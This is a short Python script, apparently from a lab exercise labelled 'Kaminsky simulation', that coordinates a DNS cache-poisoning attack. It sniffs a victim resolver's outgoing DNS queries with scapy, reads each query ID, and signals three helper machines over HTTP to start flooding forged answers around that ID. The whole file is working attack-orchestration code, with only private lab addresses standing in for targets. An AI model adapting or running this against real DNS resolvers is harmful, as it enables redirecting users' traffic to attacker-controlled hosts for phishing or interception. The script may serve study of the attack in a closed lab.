import requests, threading
from scapy.all import *

src_ip="192.168.1.3"
dst_ip="192.168.1.15"

if __name__ == "__main__":
	print("""
     _.--**--._                                   _.--**--._
    /  _    _  \\                                 /  _    _  \\
    ( (_\  /_) )                                 ( (_\  /_) )
{ \._\   /\   /_./ }                         { \._\   /\   /_./ }
/_*=-.}______{.-=*_\\   KAMINSKY SIMULATION   /_*=-.}______{.-=*_\\
 _  _.=(****)=._  _                           _  _.=(****)=._  _
(_'*_.-*`~~`*-._*'_)                         (_'*_.-*`~~`*-._*'_)
 {_*            *_}                           {_*            *_}
""")
	print("Waiting for new DNS requests...")
	while 1:
		sniffed_packet=sniff(iface="eth0", filter="src host " + src_ip + " and dst host " + dst_ip + " and dst port 53", count=1)
		if sniffed_packet[0].haslayer(DNS) and sniffed_packet[0].version == 4:
			dns=sniffed_packet[0].getlayer(DNS)
			qid=dns.id
			print("DNS request intercepted with QID of: " + str(qid) + ". Starting sending malicius response.")
			
			threading.Thread(target=requests.get, args=('http://192.168.1.8:8889?start_qid=' + str(qid-2),)).start()
			threading.Thread(target=requests.get, args=('http://192.168.1.9:8889?start_qid=' + str(qid-1000),)).start()
			threading.Thread(target=requests.get, args=('http://192.168.1.10:8889?start_qid=' + str(qid+1000),)).start()
		
